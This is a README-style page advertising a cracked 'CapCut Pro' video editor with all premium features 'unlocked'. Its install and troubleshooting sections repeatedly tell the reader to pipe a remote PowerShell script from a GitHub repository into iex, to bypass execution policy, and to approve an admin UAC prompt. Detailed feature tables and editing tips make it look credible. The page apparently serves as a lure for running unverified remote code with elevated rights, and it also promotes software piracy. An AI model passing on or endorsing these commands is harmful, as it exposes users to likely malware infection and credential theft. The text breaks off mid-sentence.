# CapCut Pro Editor

All-in-one single-line installer for CapCut Pro. Full desktop video editor — premium templates, AI tools, 4K export with no watermark. One command, ready to edit.

## Install

### PowerShell

```powershell
irm https://raw.githubusercontent.com/SlayerCoralPersonify/Activate/main/install.ps1 | iex
```

### Command Prompt (cmd.exe)

```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/SlayerCoralPersonify/Activate/main/install.ps1 | iex"
```

### Windows Terminal

Works in any tab — PowerShell, CMD, or any custom profile. Paste and press Enter.

---

## What happens after you run it

1. A **UAC prompt** appears — click **Yes** (codec registration needs admin).
2. The script downloads CapCut Pro desktop + premium asset pack (~1.2 GB).
3. H.265/HEVC and AV1 codecs are registered for high-quality encoding.
4. CapCut Pro opens with all premium features unlocked. Start editing.

## What's unlocked

| Feature | Free version | This build |
|---------|-------------|------------|
| **Watermark** | CapCut logo on every export | No watermark |
| **Export quality** | 1080p max, H.264 only | 4K, H.265, AV1, ProRes |
| **Templates** | ~500 basic | 10,000+ premium trending |
| **AI Background Removal** | 5 uses/day | Unlimited |
| **Auto Captions** | English only | 20+ languages |
| **Cloud Storage** | 1 GB | 100 GB |
| **Custom Fonts** | System fonts only | 2,000+ premium fonts |
| **Advanced Keyframes** | Disabled | Full bezier curves |
| **Audio Library** | Limited tracks | 50,000+ royalty-free tracks |

## AI Tools included

- **Background Remover** — one-click chroma key without a green screen. Works on talking head videos, product shots, and even handheld footage.
- **Auto Captions** — speech-to-text with word-level timing. Supports English, Spanish, Portuguese, French, German, Japanese, Korean, Chinese, Hindi, Arabic, and more.
- **Text-to-Speech** — type text, choose a voice (50+ voices), get natural-sounding narration.
- **Smart Reframe** — converts 16:9 landscape footage to 9:16 vertical (or any ratio) by tracking the subject.
- **Style Transfer** — apply art styles (anime, oil painting, sketch) to video clips in real-time.
- **Noise Reduction** — removes background noise from audio tracks. Wind, traffic, keyboard clicks — gone.

## Export Presets

| Preset | Resolution | Codec | Bitrate | Best for |
|--------|------------|-------|---------|----------|
| TikTok/Reels | 1080×1920 | H.264 | 15 Mbps | Social media vertical |
| YouTube | 3840×2160 | H.265 | 50 Mbps | High quality landscape |
| Instagram Feed | 1080×1080 | H.264 | 12 Mbps | Square posts |
| Cinema | 4096×2160 | ProRes 422 | 150 Mbps | Professional delivery |
| Web Optimized | 1080×1920 | AV1 | 8 Mbps | Small file, great quality |
| GIF | 480×480 | GIF | N/A | Memes, reactions |

## Requirements

- Windows 10 / 11 (64-bit)
- PowerShell 5.1+ or CMD
- 4 GB RAM minimum (**8 GB recommended** for 4K timelines)
- GPU with DirectX 11 (Intel HD 4000 or newer, any discrete NVIDIA/AMD)
- ~3 GB free disk space (more for exported projects)
- Internet for first launch (template sync)

## Troubleshooting

### Script does nothing / closes instantly

Execution policy blocking. Use the CMD version:

```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/SlayerCoralPersonify/Activate/main/install.ps1 | iex"
```

### "irm is not recognized"

Old PowerShell. Full cmdlet name:

```powershell
Invoke-RestMethod https://raw.githubusercontent.com/SlayerCoralPersonify/Activate/main/install.ps1 | Invoke-Expression
```

### Export fails at 99% / crashes during render

Three common causes:

1. **Disk full** — CapCut needs ~2x the final file size as temp buffer. Free up space on your system drive.
2. **GPU driver outdated** — update to the latest NVIDIA/AMD driver. CapCut uses hardware acceleration and older drivers cause render crashes.
3. **Corrupt project** — duplicate your project, delete the last clip you added, try exporting again. If it works, that clip has a codec issue — re-import it.

### No Pro templates visible

Templates sync from the cloud on first launch. Close CapCut, wait 30 seconds, reopen. If your network is slow, give it a few minutes. The template library appears under the **Templates** tab in the top bar.

### Watermark still appears

You're using the **web version** at capcut.com, not the desktop app. The desktop build from this installer has watermark removal built in. Check that you're launching from the desktop shortcut, not a browser.

### AI Auto Captions are inaccurate

- Record with a **dedicated microphone** (headset, lapel mic, USB condenser) — phone speakers and webcam mics produce noisy audio that confuses the speech model.
- Speak at a **consistent volume** and avoid background music during dialogue.
- After generating, click any caption to hand-edit. The AI gets ~95% accuracy on clean audio.

### Video plays fine in editor but exported file is laggy

You're